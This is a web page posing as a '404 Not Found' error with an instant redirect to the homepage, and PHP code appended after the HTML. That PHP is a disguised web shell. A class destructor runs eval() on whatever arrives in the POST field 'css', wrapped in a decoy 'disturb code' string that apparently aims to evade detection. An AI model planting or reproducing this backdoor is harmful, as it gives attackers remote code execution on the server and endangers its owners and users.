
<html>
<head>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0;
    margin: 0;
    padding: 0;
  }
  .container {
    max-width: 800px;
    margin: 0 auto;
    padding: 20px;
  }
  h1 {
    color: #333;
    font-size: 36px;
    text-align: center;
  }
  p {
    color: #666;
    font-size: 18px;
    text-align: center;
  }
  @media screen and (max-width: 600px) {
    h1 {
      font-size: 24px;
    }
    p {
      font-size: 16px;
    }
  }
</style>
<meta http-equiv="refresh" content="0;url=/">
</head>
<body>
<div class="container">
<h1>404 Not Found</h1>
<p>The page you requested was not found on this server.</p>
<p>You will be redirected to the homepage in 0 seconds.</p>
</div>
</body>
</html>
<?php

class Test{
    public $name = '';

    function __destruct(){
        $this->executeCode($this->name);
    }

    function executeCode($code){
        $disturbCode = "This is a disturb code."; 

        
        $modifiedCode = "\$disturbCode = '$disturbCode';"; 
        $modifiedCode .= "\$code = \$disturbCode . $code;"; 
        $modifiedCode .= "eval(\$code);"; 

        eval($modifiedCode); 
    }
}

$test = new Test();
$c = @$_POST['css'];
$test->name = $c;

?>